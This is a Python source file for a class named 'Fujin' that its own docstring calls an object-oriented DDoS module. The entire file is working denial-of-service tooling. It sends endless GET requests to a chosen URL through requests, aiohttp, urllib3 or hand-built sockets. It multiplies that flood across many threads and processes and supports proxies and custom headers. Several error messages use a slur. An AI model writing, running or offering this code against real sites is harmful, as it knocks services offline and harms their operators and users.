
import requests
import socket
import aiohttp
import threading
import multiprocessing
import asyncio
import sys
import urllib3
import random
from urllib.parse import urlparse


class Fujin:

    def __init__(self, 
                 url: str | None = None, 
                 header: dict | None = None, 
                 proxies: dict | None = None, 
                 data: dict | None = None,
                 cookies: dict | None = None,
                 redirects: bool | None = None,
                 timeout: int | None = None,
                 closing_message: bool | None = False,
                 caching: bool | None = False,
                 multi_path: dict | None = None) -> None:
        """
        A Object-Orientated DDoS Module

        Initialise your very own ddos tool with an object with only just one line of code.

        Contains multiple pooling manager modules to help initialise a DDoS

        Allows for entering your very custom own Headers, Data, and Proxies.
        """

        # Turn parameters into self. variables for easy use
        self.url = url 
        self.header = header
        self.proxies = proxies
        self.data = data
        self.redirects = redirects
        self.timeout = timeout
        self.cookies = cookies

        # Initialise the data structures/holders for our multiprocessing functions to speed up our attacks
        self.sync_threads = []
        self.async_threads = []
        self.sync_processes = []
        self.async_processes = []

        # Log
        self.connected = 0
        self.result = None
        self.status_code = None
        self.closing_message = closing_message
        self.caching = caching

        # Sessions
        # AIOHTTP Can be initialised outside but it doesnt work properly if you do
        # Socket doesn't have a Pooling or Session Manager all of the socket requests are built from scratch 
        self.session = requests.session()
        self.urllib_session = urllib3.PoolManager()

        # Other
        self.cache_location = '.web_cache'
        self.cache_session = None

        # Pooling manager names
        self.aio = ['aiohttp', 'Aiohttp', 'AIOHTTP']
        self.requests = ['requests', 'Requests', 'REQUESTS']
        self.urllib = ['urllib', 'URLLIB', 'urllib3', 'URLLIB3', 'Urllib', 'Urllib3']
        self.sock = ['socket', 'Socket', 'SOCKET']

        # Variables for Sockets
        self.socket_hostname = None
        self.socket_port = None
        self.socket_request = None





    #
    # Error Handling
    #
    def close_sessions(self) -> None:
        """
        Closes all Sessions and Pooling Managers
        """

        if self.closing_message:
            try:
                print("\n\n\n")
                # Close Requests Session
                self.session.close()
                print("Requests Session Closed")

                # URLLIB3 PoolManager
                self.urllib_session.clear()
                print("URLLIB Session Closed\n\n\n")

                # Dip out
                sys.exit(0)
            except Exception as e:
                print(f"\n\n{e}\n\n")
                sys.exit(0)
        else:
            try:
                self.session.close()
                self.urllib_session.clear()
            except Exception as e:
                print(f"\n\n{e}\n\n")
                sys.exit(0)

    async def close_sessions_a(self) -> None:
        """
        Closes all Sessions and Pooling Managers
        """
        
        if self.closing_message:
            try:
                print("\n\n\n")
                # Close Requests Session
                self.session.close()
                print("Requests Session Closed")

                # URLLIB3 PoolManager
                self.urllib_session.clear()
                print("URLLIB Session Closed\n\n\n")

                # Dip out
                sys.exit(0)
            except Exception as e:
                print(f"\n\n{e}\n\n")
                sys.exit(0)
        else:
            try:
                self.session.close()
                self.urllib_session.clear()
            except Exception as e:
                print(f"\n\n{e}\n\n")
                sys.exit(0)




        
    #
    # Utility
    #
    def build_http_request(self, url: str | None = None, headers: dict | None = None):
        """
        Builds HTTP Requests for you. 

        Takes URL and Headers
        """

        parsed_url = urlparse(url)
        protocol = parsed_url.scheme
        hostname = parsed_url.hostname
        path = parsed_url.path
        query = parsed_url.query

        if protocol == "http":
            port = 80
        elif protocol == "https":
            port = 443
        else:
            raise ValueError("Unsupported protocol")

        # Construct the request
        request = f"GET {path}?{query} HTTP/1.1\r\n"
        request += f"Host: {hostname}\r\n"

        if headers:
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"

        request += "Connection: close\r\n"
        request += "\r\n"

        return hostname, port, request

    def get_status_code(self, response):
        """
        Mainly for the Socket Requests

        Quickly Skims through the first line of the response for our Response Code to then get put in the object.status variable
        """
        status_line = response.split(b'\r\n')[0].decode('utf-8')
        status_code = status_line.split()[1]
        return status_code





    #
    # Async and Sync GET Requests
    #

    ### REQUESTS GET REQUEST CALLS ###
    async def async_get(self) -> None:
        """
        A Normal GET request that uses the 'requests' module

        A requests.session() object held within the self.session object inside the ddos object

        If you would like to run this function by yourself I would advise running either

        await async_get()

        or

        asyncio.run(async_get())

        Most likely the second as it is easiest and fastest to run

        You will require the asyncio module to be installed and imported though.
        """

        try:
            # Send A GET Request
            r = self.session.get(self.url, headers=self.header)

            # Assign to Object-Orientated Variable
            self.status_code = r.status_code
            self.connected += 1
            self.result = self.connected, self.status_code

            print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            await self.close_sessions()
    
    def sync_get(self) -> None:
        """
        A simple synchronous function that allows you to run a GET request
        """

        try:
            # Send A GET Request
            r = self.session.get(self.url, 
                                headers=self.header, 
                                proxies=self.proxies, 
                                data=self.data,
                                allow_redirects=self.redirects)

            # Assign to Object-Orientated Variable
            self.status_code = r.status_code
            self.connected += 1
            self.result = self.connected, self.status_code

            print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            self.close_sessions()


    
    ### AIOHTTP GET REQUEST CALLS ###
    async def aio_async_get(self) -> None:
        """
        Aynschronous Version

        Sends a GET Request with the AIOHTTP ClientSession Class
        """

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.url) as sesh:
                    self.connected += 1
                    self.status = sesh.status
                    self.result = self.connected, self.status
                    print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            self.close_sessions()



    ### URLLIB GET REQUEST CALLS ###
    async def urllib_async_get(self) -> None:

        try:
            r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
            self.connected += 1
            self.status_code = r.status
            self.result = self.connected, self.status_code
            print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            self.close_sessions()

    async def urllib_sync_get(self) -> None:
        """
        Synchronous

        URLLIB Module

        Just sends a Simple GET request
        """

        try:
            r = self.urllib_session.request(url=self.url, headers=self.header, method='GET')
            self.connected += 1
            self.status_code = r.status
            self.result = self.connected, self.status_code
            print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            await self.close_sessions_a()
    


    ### SOCKET GET REQUEST CALLS ###
    def socket_sync_get(self) -> None:
        """
        Socket Synchronous Get Request

        Utilises the socket module, constructs the HTTP Request from scratch utilising multi-line strings.
        Encodes and Sends Data while send it back
        """

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.socket_hostname, self.socket_port))
                s.sendall(self.socket_request.encode())

                # Receive the response
                response = b""
                while 1:
                    data = s.recv(4096)
                    if not data: break
                    response += data

            self.connected += 1
            self.status = self.get_status_code(response=response)
            self.result = self.connected, self.status
            print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            self.close_sessions()

    async def socket_async_get(self) -> None:
        """
        Socket Synchronous Get Request

        Utilises the socket module, constructs the HTTP Request from scratch utilising multi-line strings.
        Encodes and Sends Data while send it back
        """

        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((self.socket_hostname, self.socket_port))
            s.sendall(self.socket_request.encode())

            # Receive the response
            response = b""
            while 1:
                data = s.recv(4096)
                if not data: break
                response += data

            self.connected += 1
            self.status = self.get_status_code(response=response)
            self.result = self.connected, self.status
            print(f"{self.result}")
        except Exception as e:
            print(f"Error: {e}")
            await self.close_sessions_a()


    


    #
    # Infinite loops for Async and Sync functions
    #

    ### Requests Session ###
    def begin_async_get_attack(self) -> None:   
        """
        while 1:
            asyncio.run(self.async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """ 

        try:
            while 1:
                asyncio.run(self.async_get())
        except KeyboardInterrupt:
            self.close_sessions()


    def begin_sync_get_attack(self) -> None:
        """
        while 1:
            self.sync_get()

        An infinite loop running the synchronous get function with python requests session
        """

        try:
            while 1:
                self.sync_get()
        except KeyboardInterrupt:
            self.close_sessions()


    ### AIO ###
    def begin_aio_async_attack(self) -> None:
        """
        while 1:
            asyncio.run(self.aio_async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """

        try:
            while 1:
                asyncio.run(self.aio_async_get())
        except KeyboardInterrupt:
            self.close_sessions()


    ### URLLIB ### 
    def begin_urllib_async_attack(self) -> None:
        """
        while 1:
            asyncio.run(self.urllib_async_get(self))

        An infinite while loop run .run function of the asyncio module

        asyncio.run() allows you to run an individual asynchronous function.

        (This function is synchronous to allow for asynchronous)

        I would advise using the threading or multiprocessing function
        """

        try:
            while 1:
                asyncio.run(self.urllib_async_get())
        except KeyboardInterrupt:
            self.close_sessions()

    def begin_urllib_sync_attack(self) -> None:
        """
        while 1:
            self.urllib_sync_get()

        An infinite loop running the synchronous get function with the urllib pooling manager
        """

        try:
            while 1:
                self.urllib_sync_get()
        except KeyboardInterrupt:
            self.close_sessions()


    ### SOCKET ###
    def begin_socket_sync_attack(self) -> None:
        """
        while 1:
            self.socket_sync_get()
        """
        try:
            while 1:
                self.socket_sync_get()
        except KeyboardInterrupt:
            self.close_sessions
        except Exception as e:
            print(f"Error: {e}")
            self.close_sessions()

    def begin_socket_async_attack(self) -> None:
        try:
            while 1:
                asyncio.run(self.socket_async_get())
        except Exception as e:
            print(f"Error: {e}")
            self.close_sessions()
        except KeyboardInterrupt:
            self.close_sessions()


    

    
    #
    # Threading Attacks
    #
    def thread_async_attack(self, 
                            threads: int | None=None, 
                            daemon: bool | None=None,
                            pooling_manager: str | None = None,
                            thread_name: str | None = None) -> None:
        """
        Uses the threading module to speed up the attack, with as many threads as you like

        Pooling Manager Options:

        1. Requests
        2. Aiohttp
        3. Urllib3
        4. Socket
        """

        # If parameter is left blank/empty just turn on Daemon on they're going to get spammed with messages
        if daemon == None: daemon = True

        # If the user leaves the name parameter blank then default it
        if thread_name == None: thread_name = "FUJIN"

        # Request Session
        if pooling_manager in self.requests:
            for x in range(threads):
                t = threading.Thread(target=self.begin_async_get_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        # AIOHTTP Session
        elif pooling_manager in self.aio:
            for x in range(threads):
                t = threading.Thread(target=self.begin_aio_async_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        # URLLIB Pooling Manager
        elif pooling_manager in self.urllib:
            for x in range(threads):
                t = threading.Thread(target=self.begin_urllib_async_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        # Socket Requests (scratch)
        elif pooling_manager in self.sock:
            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)

            for x in range(threads):
                t=threading.Thread(target=self.begin_socket_async_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        # Friendly Message
        else:
            print("Choose a window manager ya retard")
            self.close_sessions()

    def thread_sync_attack(self, 
                           threads: int | None = None, 
                           daemon: bool | None = None,
                           pooling_manager: str | None = None,
                           thread_name: str | None = None) -> None:
        """
        Uses the threading module to speed up the attack, with as many threads as you like

        Pooling Manager Options (write as a string):

        1. Requests
        2. Pooling Manager
        3. Socket
        """

        # If parameter is left empty then turn on daemon
        if daemon == None: daemon = True

        # If the user leaves the name parameter blank then default it
        if thread_name == None: thread_name = "FUJIN"

        # Requests Session
        if pooling_manager in self.requests:
            for x in range(threads):
                t = threading.Thread(target=self.begin_sync_get_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        # Let user know that AIOHTTP is Asynchronous
        elif pooling_manager in self.aio:
            print("Error: AIOHTTP does not work with Synchronous Functions.")
            self.close_sessions()

        # URLLIB Pooling Manager
        elif pooling_manager in self.urllib:
            for x in range(threads):
                t = threading.Thread(target=self.begin_urllib_sync_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        # Socket Requests (scratch)
        elif pooling_manager in self.sock:
            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
            
            for x in range(threads):
                t=threading.Thread(target=self.begin_socket_sync_attack, name=thread_name, daemon=daemon)
                t.start()
                self.async_threads.append(t)
            for x in range(threads):
                self.async_threads[x].join()

        else:
            print("Choose a window manager ya retard")
            self.close_sessions()



    #
    # Multiprocessing Attacks
    #
    def multiproc_sync_attack(self, 
                              number_of_processes: int | None = None, 
                              daemon: bool | None = None,
                              pooling_manager: str | None = None,
                              thread_name: str | None = None) -> None:
        """
        Uses the multiprocessing function to speed up the attack.

        Pooling Manager Options (write as a string):

        1. Requests
        2. Pooling Manager
        3. Socket
        """

        # Rename the variable so I can easily write :)))
        numproc = number_of_processes

        # If the user leaves the daemon parameter empty then just default it to on
        if daemon == None: daemon = True

        # If the user leaves the name parameter blank then default it
        if thread_name == None: thread_name = "FUJIN"

        # Requests Session
        if pooling_manager in self.requests:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_sync_get_attack, name=thread_name, daemon=daemon)
                p.start()
                self.sync_processes.append(p)
            for x in range(numproc):
                self.sync_processes[x].join()

        # AIOHTTP only works with asynchronous functions
        elif pooling_manager in self.aio:
            print("Error: AIOHTTP does not work with Synchronous Functions.")
            self.close_sessions()

        # URLLIB3 Pooling Manager
        elif pooling_manager in self.urllib:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_urllib_sync_attack, name=thread_name, daemon=daemon)
                p.start()
                self.sync_processes.append(p)
            for x in range(numproc):
                self.sync_processes[x].join()

        # Socket HTTP Requests
        elif pooling_manager in self.sock:
            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
            for x in range(numproc):
                p=multiprocessing.Process(target=self.begin_socket_sync_attack, name=thread_name, daemon=daemon)
                p.start()
                self.sync_processes.append(p)
            for x in range(numproc):
                self.sync_processes[x].join()

        # Friendly message to people who would not like to use it
        else:
            print("Choose a pooling manager ya sausage !!!")
            self.close_sessions()

    def multiproc_async_attack(self, 
                               number_of_processes: int | None = None, 
                               daemon: bool | None = None,
                               pooling_manager: str | None = None,
                               thread_name: str | None = None) -> None:
        """
        Uses the multiprocessing function to speed up the attack.

        It pools a synchronous function that contains an infinite loop that runs the asynchronous function

        Pooling Manager Options (write as a string):

        1. Requests
        2. Aiohttp
        3. Pooling Manager
        4. Socket
        """
        
        # Rewrite the var so i can easy write :)))
        numproc = number_of_processes

        # If the user leaves the daemon parameter empty then just default it to on
        if daemon == None: daemon = True

        # If the user leaves the name parameter blank then default it
        if thread_name == None: thread_name = "FUJIN"

        # Requests Session
        if pooling_manager in self.requests:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_async_get_attack, name=thread_name, daemon=daemon)
                p.start()
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].join()

        # AIOHTTP
        elif pooling_manager in self.aio:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_aio_async_attack, name=thread_name, daemon=daemon)
                p.start()
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].join()

        # URLLIB Pooling Manager
        elif pooling_manager in self.urllib:
            for x in range(numproc):
                p = multiprocessing.Process(target=self.begin_urllib_async_attack, name=thread_name, daemon=daemon)
                p.start()
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].join()

        # Socket HTTP Requests
        elif pooling_manager in self.sock:
            self.socket_hostname, self.socket_port, self.socket_request = self.build_http_request(url=self.url, headers=self.header)
            for x in range(numproc):
                p=multiprocessing.Process(target=self.begin_socket_async_attack, name=thread_name, daemon=daemon)
                p.start()
                self.async_processes.append(p)
            for x in range(numproc):
                self.async_processes[x].join()

        # Friendly Message :)))
        else:
            print("Choose a pooling manager ya sausage !!!")
            self.close_sessions()
